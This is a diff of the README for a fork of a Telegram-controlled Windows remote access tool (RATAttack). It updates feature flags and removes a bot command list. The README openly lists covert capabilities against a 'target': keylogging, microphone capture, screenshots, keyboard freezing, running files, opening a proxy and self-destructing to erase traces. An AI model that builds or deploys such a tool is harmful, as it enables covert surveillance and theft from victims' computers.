@@ -3,6 +3,8 @@
 Windows Remote Administration Tool via Telegram (Python 2.7) | Originally created by <a href="http://github.com/Ritiek">Ritiek</a>, Forked and modified by <a href="http://github.com/mvrozanti">mvrozanti</a>
 
 This modified version uses Telegram bot API v2, instead of the traditional v1. The main change is keyboard buttons instead of text typing.
+I will try to add new features.
+In the meanwhile, cd, download, upload, run and delete commands will not work.
 
 ### Why another one?
 
@@ -21,28 +23,27 @@ This modified version uses Telegram bot API v2, instead of the traditional v1. T
 - Run keylogger on the target
 - Get target PC's Windows version, processor and more
 - Get target PC's IP address information and approximate location on map
-- Delete files or folder on target
+- [WIP] Delete files or folder on target
 - Show current directory on target
-- Change current directory on target
+- [WIP] Change current directory on target
 - List current or specified directory on target
-- Download any file from the target
+- [WIP] Download any file from the target
 - Upload local files to the target. Send your image, pdf, exe or anything as `file` to the Telegram bot
 - Autostart playing a video in fullscreen and no controls for a youtube video on target
 - Screenshots of the target
-- Execute any file on the target
+- [WIP] Execute any file on the target
 - Access to microphone on target
 - Start HTTP Proxy Server
 - Freeze target's keyboard
 - Return the target's ARP table
-- Return the target's Tasklist (process list)
 - [WIP] Schedule tasks to run at specified time
 - [WIP] Freeze target's mouse
-- [WIP] Get active processes and services
+- Get active processes and services
 - [WIP] Capture clipboard (Text, Image)
 - [WIP] Disable/Enable mouse/keyboard
 - [WIP] Hide desktop icons
 - [WIP] Update .exe on target
-- [WIP] Shutdown computer
+- [WIP] Shutdown \ Reboot computer
 - [WIP] Self-Destruct RAT on the target
 - [WIP] Take snapshots from the webcam (if attached)
 - [WIP] Copy and Move files on the target
@@ -68,32 +69,6 @@ This modified version uses Telegram bot API v2, instead of the traditional v1. T
 <img src="http://i.imgur.com/XKARtrp.png">
 - A folder named `RATAttack` will be created in your working directory containing `keylogs.txt` and any files you upload to the bot.
 
-### Commands:
-
-When using the below commands; use `/` as a prefix. For example: `/pc_info`.
-
-```
-capture_pc - screenshot PC
-cd - change current directory on target
-delete - delete a file/folder on target
-download - download file from target
-freeze_keyboard - enable keyboard freeze
-unfreeze_keyboard - disable keyboard freeze
-hear - record microphone on target
-ip_info - via ipinfo.io
-keylogs - get keylogs
-ls - list contents of current or specified directory
-msg_box - display message box with text
-pc_info - PC information
-play - plays a youtube video on target
-proxy - opens a proxy server on target
-pwd - show current directory
-run - run a file on target
-self_destruct - destroy all traces from target
-to - select targets by it's name
-```
-
-You can copy the above to update your command list via `BotFather` so you don't have to type them manually.
 
 ## Compiling:
 
